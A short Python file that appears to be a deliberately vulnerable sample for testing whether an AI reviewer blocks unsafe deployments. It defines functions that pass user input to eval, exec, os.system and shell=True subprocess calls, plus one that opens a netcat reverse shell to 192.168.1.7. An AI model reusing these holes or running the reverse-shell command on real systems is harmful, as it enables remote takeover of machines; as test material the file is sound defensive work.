#!/usr/bin/env python3
"""
DANGEROUS CODE - Python vulnerabilities.

This file contains dangerous Python patterns.
AI should BLOCK deployment.
"""

import os
import subprocess


def dangerous_eval(user_input):
    """DANGEROUS: Using eval() with user input."""
    result = eval(user_input)
    return result


def dangerous_exec(user_code):
    """DANGEROUS: Using exec() with user code."""
    exec(user_code)


def dangerous_os_system(command):
    """DANGEROUS: Using os.system() for command execution."""
    os.system(command)


def dangerous_subprocess(cmd):
    """DANGEROUS: Using subprocess without proper validation."""
    subprocess.call(cmd, shell=True)


def reverse_shell_attempt():
    """DANGEROUS: Reverse shell attempt."""
    os.system("nc -e /bin/bash 192.168.1.7 443")


if __name__ == "__main__":
    print("⚠️ This code contains DANGEROUS patterns!")
    print("❌ AI should BLOCK this deployment")
